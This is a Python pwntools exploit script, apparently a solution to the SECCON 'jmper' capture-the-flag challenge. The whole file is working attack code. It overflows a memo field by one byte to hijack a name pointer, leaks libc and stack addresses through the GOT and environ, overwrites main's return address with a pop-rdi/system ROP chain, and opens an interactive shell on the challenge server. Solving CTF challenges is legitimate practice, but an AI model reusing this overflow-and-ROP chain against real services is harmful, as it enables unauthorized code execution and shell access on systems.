#!/usr/bin/env python

from pwn import *

#r = remote('127.0.0.1', 4000)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = remote('jmper.pwn.seccon.jp', 5656)
libc = ELF('libc-2.19.so-8674307c6c294e2f710def8c57925a50e60ee69e')

def add():
    r.recvuntil('6. Bye :)')
    r.sendline('1')

def name(ID, content):
    r.recvuntil('6. Bye :)')
    r.sendline('2')
    r.recvuntil('ID:')
    r.sendline(str(ID))
    r.recvuntil('Input name:')
    r.sendline(content)

def wmemo(ID, content):
    r.recvuntil('6. Bye :)')
    r.sendline('3')
    r.recvuntil('ID:')
    r.sendline(str(ID))
    r.recvuntil('Input memo:')
    r.sendline(content)

def sname(ID):
    r.recvuntil('6. Bye :)')
    r.sendline('4')
    r.recvuntil('ID:')
    r.sendline(str(ID))

def smemo(ID):
    r.recvuntil('6. Bye :)')
    r.sendline('5')
    r.recvuntil('ID:')
    r.sendline(str(ID))



add()
add()
wmemo(0, 'A'*32 + '\x78')
name(0, p64(0x601fa0))
sname(1)
puts = (u64(r.recvline()[:6] + '\x00'*2))
base = puts - libc.symbols['puts']
system = base + libc.symbols['system']
stack = base + libc.symbols['environ']

name(0, p64(stack))
sname(1)
stack = u64(r.recvline()[:6] + '\x00'*2)
pop_rdi_ret = 0x400cc3

name(0, p64(0x602028))
name(1, 'sh\x00')
name(0, p64(stack-240)) # overwrite main_ret_address
name(1, p64(pop_rdi_ret) + p64(0x602028) + p64(system))

add() # call longjmp in order to back to main

r.interactive()
